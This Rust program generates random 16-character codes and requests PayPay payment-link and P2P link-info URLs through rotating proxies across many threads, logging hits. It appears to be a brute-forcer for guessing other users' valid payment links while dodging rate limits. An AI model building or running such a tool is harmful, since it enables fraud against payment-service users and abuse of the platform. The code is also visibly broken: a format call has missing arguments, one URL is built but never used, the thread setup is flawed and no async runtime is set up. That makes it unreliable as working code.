mod log;

use std::fs;

use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use uuid::Uuid;

fn main() {
    log::info("Welcome");

    let proxies_raw_txt = fs::read_to_string("proxies.txt")
        .expect("Unable to read proxies.txt file");
    let proxies = proxies_raw_txt.split("\n")
        .collect::<Vec<&str>>();
    if proxies_raw_txt.is_empty() {
        log::warn("No proxies found in proxies.txt");
    } else {
        log::success(format!("Loaded {} proxies", proxies.len()));
    }
    log::question("How many threads do you want to use?");
    let mut threads = String::new();
    std::io::stdin().read_line(&mut threads)
        .expect("Failed to read line");
    let threads: usize = threads.trim().parse()
        .expect("Please type a number!");

    for i in 0..threads {
        tokio::spawn(async move {
            let mut rng = thread_rng();
            loop {
                let chars: String = (0..16).map(|_| rng.sample(Alphanumeric) as char).collect();
                
                let url = format!("https://pay.paypay.ne.jp/{}", chars);
                let check_url = format!("https://www.paypay.ne.jp/app/v2/p2p-api/getP2PLinkInfo?verificationCode={}&client_uuid={}", chars, Uuid::new_v4());
                let client = if proxies_raw_txt.is_empty() {
                    reqwest::Client::builder()
                        .build().unwrap()
                } else {
                    let proxy = proxies[rng.gen_range(0..proxies.len())];
                    reqwest::Client::builder()
                        .proxy(reqwest::Proxy::all(proxy).unwrap())
                        .build().unwrap()
                };
                let res = client.get(&url)
                    .send().await;
                match res {
                    Ok(_) => {
                        log::success(format!("{}", url));
                    },
                    Err(_) => {
                        log::error(format!("{} | {}", url));
                    }
                }
            }
        });
    }
}

/*let mut rng = thread_rng();
loop {
    let chars: String = (0..16).map(|_| rng.sample(Alphanumeric) as char).collect();
    println!("https://pay.paypay.ne.jp/{}", chars);
}*/
